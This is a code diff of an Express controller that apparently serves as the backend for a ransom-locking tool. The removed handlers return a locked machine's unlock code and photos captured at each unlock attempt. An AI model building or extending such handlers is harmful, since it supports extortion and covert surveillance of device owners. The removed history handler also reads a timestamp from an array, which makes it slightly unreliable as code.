@@ -1,5 +1,5 @@
-const Control = require("../Models/controlModel");
-const Lock = require("../Models/lockModel");
+const Control = require("../Models/order.model");
+const Lock = require("../Models/lock.model");
 const moment = require("moment");
 exports.status_update = async (req, res) => {
   const { key } = req.body;
@@ -115,53 +115,4 @@ exports.get_last_windows_lock = async (req, res) => {
     last_lock = null;
   }
   return res.status(200).json({ last_lock });
-};
-
-exports.check_ransom_locker = async (req, res) => {
-  let ransom_state = {};
-  const { key } = req.query;
-  const search = await Lock.findOne({ key, locked: true }).sort("-createdAt");
-  if (search) {
-    ransom_state.lock_date = moment(search.createdAt).format("MMMM DD@hh:mm A");
-    ransom_state.locked = search.locked;
-    ransom_state.unlock_code = search.code;
-  } else {
-    ransom_state = null;
-  }
-  return res.status(200).json({ ransom_state });
-};
-exports.get_ransom_history = async (req, res) => {
-  let ransom_unlock_history = {};
-  const { key } = req.query;
-  const search = await Lock.find({ key, media: { $ne: [] } }).sort(
-    "-createdAt"
-  );
-  if (search) {
-    let photo_links = [];
-    let photos_dates = [];
-    var fileNames = [];
-    search.map((e, i) => {
-      var filtered = search[i].media.filter(function (el) {
-        return el != "";
-      });
-      filtered.forEach((e) => photo_links.push(e));
-    });
-
-    photo_links.forEach((e) => {
-      fileNames.push(e.split("/")[4]);
-    });
-    fileNames.forEach((e) => {
-      photos_dates.push(moment.unix(e.split("_")[3]).format("MMMM DD@hh:mm A"));
-    });
-
-    ransom_unlock_history.try_dates = photos_dates;
-    ransom_unlock_history.photo = photo_links;
-    ransom_unlock_history.last_try = moment(search.updatedAt).format(
-      "MMMM DD@hh:mm A"
-    );
-  } else {
-    ransom_unlock_history = null;
-  }
-
-  return res.status(200).json({ ransom_unlock_history });
 };
